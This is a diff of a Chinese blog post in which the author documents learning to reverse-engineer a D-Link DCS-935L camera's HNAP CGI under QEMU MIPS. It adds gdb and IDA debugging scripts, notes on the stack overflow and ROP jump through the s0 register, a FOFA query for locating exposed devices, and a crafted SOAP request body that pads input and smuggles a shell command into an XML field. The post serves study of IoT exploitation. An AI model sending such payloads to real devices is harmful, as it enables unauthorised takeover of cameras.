@@ -19,12 +19,12 @@
   <meta name="author" content="xyyr">
   <meta name="keywords" content="">
   
-    <meta name="description" content="iot固件逆向学习路由器逆向二进制安全 摄像头0day漏洞挖掘入门第一课_哔哩哔哩_bilibili 一二三课都看完了，但是自己再单独做的时候还是有很多需要回看的 1. cgi的调试 fofa 资产搜集 1app&#x3D;&quot;D_Link-DCS-935L&quot;&amp;&amp;after&#x3D;&quot;2026-06-1&quot;  固件解包后找到其web服务，一般来说，以d为后缀的总是">
+    <meta name="description" content="iot固件逆向学习路由器逆向二进制安全 摄像头0day漏洞挖掘入门第一课_哔哩哔哩_bilibili 一二三课都看完了，但是自己再单独做的时候还是有很多需要回看的   再次感叹ai的力量，除了找到溢出点后少量的纠正，自己就能提取到rop链条，其次，对于qemu异架构的使用以及调试，脚本内开启执行调试与断点与调用，网上没有直接的教程，视频里也没有对于脚本内设置断点调用的教程，ai能给出一个可行的调用">
 <meta property="og:type" content="article">
 <meta property="og:title" content="iot固件逆向学习">
 <meta property="og:url" content="https://xyyr-c.github.io/2026/03/11/iot%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="xyyr">
-<meta property="og:description" content="iot固件逆向学习路由器逆向二进制安全 摄像头0day漏洞挖掘入门第一课_哔哩哔哩_bilibili 一二三课都看完了，但是自己再单独做的时候还是有很多需要回看的 1. cgi的调试 fofa 资产搜集 1app&#x3D;&quot;D_Link-DCS-935L&quot;&amp;&amp;after&#x3D;&quot;2026-06-1&quot;  固件解包后找到其web服务，一般来说，以d为后缀的总是">
+<meta property="og:description" content="iot固件逆向学习路由器逆向二进制安全 摄像头0day漏洞挖掘入门第一课_哔哩哔哩_bilibili 一二三课都看完了，但是自己再单独做的时候还是有很多需要回看的   再次感叹ai的力量，除了找到溢出点后少量的纠正，自己就能提取到rop链条，其次，对于qemu异架构的使用以及调试，脚本内开启执行调试与断点与调用，网上没有直接的教程，视频里也没有对于脚本内设置断点调用的教程，ai能给出一个可行的调用">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608021946647.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608021946694.png">
@@ -41,8 +41,30 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608021946706.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608021946707.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608021946708.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081615232.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616269.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616270.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616271.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616272.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616273.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616274.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081614873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616275.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616276.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616277.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616278.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616279.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616280.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616281.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616282.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616283.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616284.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616285.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616286.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616287.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616288.png">
 <meta property="article:published_time" content="2026-03-11T09:37:43.125Z">
-<meta property="article:modified_time" content="2026-08-02T11:49:37.032Z">
+<meta property="article:modified_time" content="2026-08-08T08:17:24.840Z">
 <meta property="article:author" content="xyyr">
 <meta property="article:tag" content="re">
 <meta property="article:tag" content="iot">
@@ -257,7 +279,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          806 字
+          2.2k 字
         
       </span>
     
@@ -268,7 +290,7 @@
         
         
         
-          7 分钟
+          19 分钟
         
       </span>
     
@@ -310,7 +332,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年8月2日 晚上
+                    本文最后更新于 2026年8月8日 下午
                   
                 
               </p>
@@ -320,6 +342,14 @@
                 
                 <h1 id="iot固件逆向学习"><a href="#iot固件逆向学习" class="headerlink" title="iot固件逆向学习"></a>iot固件逆向学习</h1><h2 id="路由器逆向"><a href="#路由器逆向" class="headerlink" title="路由器逆向"></a>路由器逆向</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV19VAUzUEL6/?spm_id_from=333.788.recommend_more_video.4&trackid=web_related_0.router-related-2589621-4gb82.1785485181481.139&vd_source=5aaa6cf536f1e9f7b67225df23bb5e07">二进制安全 摄像头0day漏洞挖掘入门第一课_哔哩哔哩_bilibili</a></p>
 <p>一二三课都看完了，但是自己再单独做的时候还是有很多需要回看的</p>
+<blockquote>
+<ul>
+<li><p>再次感叹ai的力量，除了找到溢出点后少量的纠正，自己就能提取到rop链条，其次，对于qemu异架构的使用以及调试，脚本内开启执行调试与断点与调用，网上没有直接的教程，视频里也没有对于脚本内设置断点调用的教程，ai能给出一个可行的调用方式。</p>
+</li>
+<li><p>遥想之前没有gdb调试教程的时候，硬找十分难学，后来有人出了详细的每一步的开始以及调用教程，才基本掌握调试方法。但是没有人出详细教程的时候自行十分难学难找，现在的ai啊。</p>
+</li>
+</ul>
+</blockquote>
 <h4 id="1-cgi的调试"><a href="#1-cgi的调试" class="headerlink" title="1. cgi的调试"></a>1. cgi的调试</h4><ul>
 <li><p>fofa 资产搜集</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">&quot;D_Link-DCS-935L&quot;</span>&amp;&amp;after=<span class="hljs-string">&quot;2026-06-1&quot;</span><br></code></pre></td></tr></table></figure></li>
@@ -378,6 +408,69 @@
 <blockquote>
 <p>待办：调试找到跳转点，调试看注入点，学习在脚本执行时进行qemu的mips架构的调试，学习ai的另一种方法的区别，调试查看字符串被划分时栈内存的移动情况，学习基础的mips架构下的指令。</p>
 </blockquote>
+<p>手动开启调试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./qemu-mips -g 1234 web/cgi-bin/hnap/hnap_service<br></code></pre></td></tr></table></figure>
+
+<p>另一个窗口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span>-multiarch web/cgi-bin/hnap/hnap_service<br><span class="hljs-attribute">target</span> remote :<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure>
+
+<p>get ida 小技巧，可以直接将伪代码与汇编对照</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081615232.png" srcset="/img/loading.gif" lazyload alt="image-20260803151523469"></p>
+<p>常用的汇编：</p>
+<p>lw:将右侧中存的值写到左侧</p>
+<p>同理：sw左往右写</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616269.png" srcset="/img/loading.gif" lazyload alt="image-20260803152338185"></p>
+<p>关于寄存器</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616270.png" srcset="/img/loading.gif" lazyload alt="image-20260803153247564"></p>
+<p>（与函数运行相关，如果不恢复s0-s8，不会检测错误，只是会运行有误）</p>
+<p>这里在清出一片0来</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616271.png" srcset="/img/loading.gif" lazyload alt="image-20260803154415614"></p>
+<p>经过脚本测试，SOAP_ACTION随便填也没影响。</p>
+<h4 id="2-qumu在py脚本内调用测试"><a href="#2-qumu在py脚本内调用测试" class="headerlink" title="2.qumu在py脚本内调用测试"></a>2.qumu在py脚本内调用测试</h4><p>寻找溢出点偏移时可以用这种填充来方便直接找到，省的自己算</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>payload = cyclic(<span class="hljs-number">200</span>)<br>p.send(payload)<br>offset = cyclic_find(<span class="hljs-number">0x61616167</span>)<br></code></pre></td></tr></table></figure>
+
+<p>需要恢复gp的原因，system函数这里需要resolve来处理环境</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616272.png" srcset="/img/loading.gif" lazyload alt="image-20260803174558807"></p>
+<p>在脚本内附加调试的方法,qemu的启动为-g时会停留在start等待调试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">DEBUG=<span class="hljs-string">&#x27;--debug&#x27;</span> <span class="hljs-keyword">in</span> sys.argv <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;-d&#x27;</span> <span class="hljs-keyword">in</span> sys.argv<br>PORT=<span class="hljs-string">&#x27;1234&#x27;</span><br>rest=[a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> sys.argv[<span class="hljs-number">1</span>:] <span class="hljs-keyword">if</span> a <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;--debug&#x27;</span>,<span class="hljs-string">&#x27;-d&#x27;</span>)]<br><span class="hljs-keyword">if</span> DEBUG <span class="hljs-keyword">and</span> rest <span class="hljs-keyword">and</span> rest[<span class="hljs-number">0</span>].isdigit():<br>    PORT=rest[<span class="hljs-number">0</span>]; rest=rest[<span class="hljs-number">1</span>:]<br><br><span class="hljs-keyword">if</span> DEBUG:<br>    qemu_args=[QEMU,<span class="hljs-string">&#x27;-L&#x27;</span>,S,<span class="hljs-string">&#x27;-g&#x27;</span>,PORT,target]    <span class="hljs-comment"># 开 gdbstub, qemu 暂停等 gdb</span><br><span class="hljs-keyword">else</span>:<br>    qemu_args=[QEMU,<span class="hljs-string">&#x27;-L&#x27;</span>,S,target]<br>p=process(qemu_args,env=env,stdin=PIPE,stdout=PIPE,stderr=STDOUT)<br><br><span class="hljs-keyword">if</span> DEBUG:<br>    <span class="hljs-comment"># 脚本内自动弹 gdb(pwndbg): 终端固定 GUI, 不做 DISPLAY/shutil 检测</span><br>    p.send(body)                                  <span class="hljs-comment"># 先发 body(管道中, gdb continue 后程序才读)</span><br>    log.info(<span class="hljs-string">f&#x27;调试模式: qemu gdbstub 端口 <span class="hljs-subst">&#123;PORT&#125;</span>, body 已发送; 正在自动弹 gdb 窗口(pwndbg)...&#x27;</span>)<br>    context.terminal=[<span class="hljs-string">&#x27;x-terminal-emulator&#x27;</span>,<span class="hljs-string">&#x27;-e&#x27;</span>]<br>    <span class="hljs-comment"># 注意: attach 传 (host,port) 元组时 pwntools 自动注入 &quot;target remote host:port&quot;,</span><br>    <span class="hljs-comment">#       gdbscript 里不能再写 target remote(会断旧连重连超时)!</span><br>    <span class="hljs-comment">#       set auto-solib-add off: qemu user mode 下共享库地址与本地 ELF 不匹配,</span><br>    <span class="hljs-comment">#       自动加载会 gdb internal-error 崩溃(不要 set sysroot!)</span><br>    gdbscript=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    set pagination off </span><br><span class="hljs-string">    set auto-solib-add off</span><br><span class="hljs-string">    b *0x4033f0</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    gdb.attach((<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-built_in">int</span>(PORT)), gdbscript=gdbscript, exe=target)<br>    log.info(<span class="hljs-string">&#x27;gdb 窗口已弹出, 调试完成后在 gdb 里 quit 即可&#x27;</span>)<br>    p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p>ida模式：注意，调试完后ida点运行，不能直接点终止，否则会结束终端处的执行。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span> IDA_MODE:<br>    # IDA 模式: 只开 gdbstub, 不调用 gdb.attach(gdbstub 单连接, IDA 要独占!)<br>    p.send(body)                                  # 先发 body(管道中, IDA continue 后程序才读)<br>    log.<span class="hljs-built_in">info</span>(f<span class="hljs-string">&#x27;IDA 模式: qemu gdbstub 端口 &#123;PORT&#125;, body 已发送&#x27;</span>)<br>    log.<span class="hljs-built_in">info</span>(f<span class="hljs-string">&#x27;现在用 IDA 附加:&#x27;</span>)<br>    log.<span class="hljs-built_in">info</span>(f<span class="hljs-string">&#x27;  1. Debugger → Select debugger → Remote GDB debugger&#x27;</span>)<br>    log.<span class="hljs-built_in">info</span>(f<span class="hljs-string">&#x27;  2. Debugger → Process options → Hostname=127.0.0.1 Port=&#123;PORT&#125;&#x27;</span>)<br>    log.<span class="hljs-built_in">info</span>(f<span class="hljs-string">&#x27;  3. Debugger → Attach to process → OK&#x27;</span>)<br>    log.<span class="hljs-built_in">info</span>(f<span class="hljs-string">&#x27;  4. F2 断 0x4033f0 → F9 运行 → 寄存器看 $s0/$t9, G 跳 0x43a830 看命令串&#x27;</span>)<br>    log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&#x27;调试完成后 回本终端按enter&#x27;</span>)<br>    pause()<br>    p.interactive()<br>    sys.exit(0)<br><br></code></pre></td></tr></table></figure>
+
+<p>要卡到system执行时才能停止</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616273.png" srcset="/img/loading.gif" lazyload alt="image-20260803192656262"></p>
+<p>先进入有漏洞的初始位置的地方下断点</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616274.png" srcset="/img/loading.gif" lazyload alt="image-20260806184606908"></p>
+<p>补充一个写入的地方（仅此一次的输入处），读取了之前输入的长度，并从输入管道中提取。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081614873.png" srcset="/img/loading.gif" lazyload alt="image-20260806185035600"></p>
+<p>输入的命令从这里开始的</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616275.png" srcset="/img/loading.gif" lazyload alt="image-20260806185528779"></p>
+<p>以下是写入的内容（小tips：iml文件中只要符合这种格式就可以加入，ThisIsGoodThing其实是没有的，只是自行命名输入的，加入command这种字符串，方便定位输入的位置）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">body=(b&#x27;<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">SetDeviceSettings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://192.168.0.1/HNAP1/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Action</span>&gt;</span>SetDeviceSettings<span class="hljs-tag">&lt;/<span class="hljs-name">Action</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">DeviceName</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceName</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ThisIsGoodThing</span>&gt;</span>command:&#x27;<br>    + b&#x27;:;&#x27;*30000 + cmd + b&#x27;;echo 114514 #<span class="hljs-tag">&lt;/<span class="hljs-name">ThisIsGoodThing</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">SetDeviceSettings</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span>&#x27;)<br><br></code></pre></td></tr></table></figure>
+
+<p>输入的内容会被生成为一个xml文件，后续以xml文件的形式读取（dangers函数是用ida自行重命名的函数）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616276.png" srcset="/img/loading.gif" lazyload alt="image-20260806200239849"></p>
+<p>重点关注0x402030之后开始的strcpy</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616277.png" srcset="/img/loading.gif" lazyload alt="image-20260806200358474"></p>
+<p>这里的strtok根据“ ”0x20空格来截断提取，提取后改为0x00（字符串结尾），并赋值</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616278.png" srcset="/img/loading.gif" lazyload alt="image-20260806204304078"></p>
+<p>两次strtok，把之前的0x20截为了0x00，正好使其为正确的地址</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616279.png" srcset="/img/loading.gif" lazyload alt="image-20260806204445340"></p>
+<p>hashcode会检测不通过，直接返回</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616280.png" srcset="/img/loading.gif" lazyload alt="image-20260806204829737"></p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616281.png" srcset="/img/loading.gif" lazyload alt="image-20260806204833261"></p>
+<p>最后恢复了s0-s8寄存器（在栈的最后），最后的4个字节是跳转到的地址，jump_to前的那些字节对应的是s0-s8</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616282.png" srcset="/img/loading.gif" lazyload alt="image-20260806210506512"><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616283.png" srcset="/img/loading.gif" lazyload alt="image-20260806210534840"></p>
+<p>由于mip异架构，有延迟槽机制：分支或跳转调用下面的一条一定会执行，且先于跳转指令。这里实际传参在调用的下面，也就是会把s0寄存器传递到a0作为参数，这也是选择这个sysytem函数调用的原因，其他的system函数无法用s0直接调用，而s0-s8这一组寄存器是最容易进行修改的。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616284.png" srcset="/img/loading.gif" lazyload alt="image-20260806211129424"></p>
+<p>启用调试后正常执行</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616285.png" srcset="/img/loading.gif" lazyload alt="image-20260808151209846"></p>
+<p>思考：system执行后的gp寄存器是调用的参数，如果不恢复会怎么样，调试看看</p>
+<p>如果不恢复的话，发现无法找到正确的system地址</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616286.png" srcset="/img/loading.gif" lazyload alt="image-20260808153149759"></p>
+<p>也就是以下这段跳转，其实使用gp索引来对应到的system，如果不恢复的话，无法正常索引到system的调用地址。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616287.png" srcset="/img/loading.gif" lazyload alt="image-20260808153224435"></p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608081616288.png" srcset="/img/loading.gif" lazyload alt="image-20260808153235334"></p>
 
                 
               </div>
